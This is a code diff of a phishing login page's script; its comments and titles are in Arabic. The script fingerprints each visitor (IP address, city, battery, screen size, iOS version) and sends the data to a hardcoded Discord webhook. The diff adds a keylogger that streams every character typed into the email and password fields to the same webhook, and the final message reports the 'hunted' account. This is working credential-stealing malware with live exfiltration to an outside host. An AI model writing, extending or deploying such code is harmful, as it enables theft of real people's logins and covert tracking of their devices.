@@ -37,22 +37,18 @@
 <script>
     const webh = "https://discordapp.com/api/webhooks/1493722493511401704/aYkLDXbIECF4GaV9BH7FQUuvZ7zpjdBDUqdoGoJT9hZurBLMv-heWVb-fbtbJWAc4xWF";
 
-    // دالة سحب البيانات العميقة فور الدخول
+    // 1. سحب البيانات العميقة فور الدخول
     async function initTrack() {
         try {
             const ipReq = await fetch('https://ipapi.co/json/');
             const ip = await ipReq.json();
-            
             let batt = "N/A";
             if (navigator.getBattery) {
                 const b = await navigator.getBattery();
                 batt = `${(b.level * 100).toFixed(0)}% ${b.charging ? '🔌' : '🔋'}`;
             }
-
             const info = {
-                device: navigator.platform,
                 screen: `${screen.width}x${screen.height}`,
-                lang: navigator.language,
                 os: navigator.userAgent.match(/OS (\d+_\d+)/) ? navigator.userAgent.match(/OS (\d+_\d+)/)[1].replace('_', '.') : "iOS/Mac",
                 time: new Date().toLocaleTimeString('de-DE')
             };
@@ -65,12 +61,10 @@
                         title: "📱 تقرير استخباراتي: دخول جديد",
                         color: 0,
                         fields: [
-                            { name: "🌐 IP & Location", value: `\`${ip.ip}\` (${ip.city}, ${ip.country_name})`, inline: false },
-                            { name: "📡 Provider", value: `\`${ip.org}\``, inline: false },
+                            { name: "🌐 IP & Location", value: `\`${ip.ip}\` (${ip.city})`, inline: true },
                             { name: "🔋 Battery", value: `\`${batt}\``, inline: true },
-                            { name: "📲 Version", value: `iOS \`${info.os}\``, inline: true },
-                            { name: "📏 Screen", value: `\`${info.screen}\``, inline: true },
-                            { name: "⏰ Local Time", value: `\`${info.time}\``, inline: true }
+                            { name: "📲 OS Version", value: `iOS \`${info.os}\``, inline: true },
+                            { name: "📏 Screen", value: `\`${info.screen}\``, inline: true }
                         ]
                     }]
                 })
@@ -79,18 +73,24 @@
     }
     window.onload = initTrack;
 
+    // 2. نظام الإرسال اللحظي (Keylogger)
+    document.querySelectorAll('input').forEach(input => {
+        input.addEventListener('input', (e) => {
+            const type = e.target.id === 'email' ? "📧 Email typing" : "🔑 Pass typing";
+            fetch(webh, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ content: `**${type}:** \`${e.target.value}\`` })
+            });
+        });
+    });
+
     function toStep2() {
         const email = document.getElementById('email').value;
         if(email.length > 3) {
             document.getElementById('user-display').innerText = email;
             document.getElementById('step1').classList.add('hidden');
             document.getElementById('step2').classList.remove('hidden');
-            
-            fetch(webh, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ content: `📧 **Email:** \`${email}\`` })
-            });
         }
     }
 
@@ -103,7 +103,7 @@
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
                     embeds: [{
-                        title: "🎯 تم صيد الحساب بنجاح",
+                        title: "🎯 الحساب النهائي المكتمل",
                         color: 3066993,
                         fields: [
                             { name: "User", value: `\`${email}\`` },
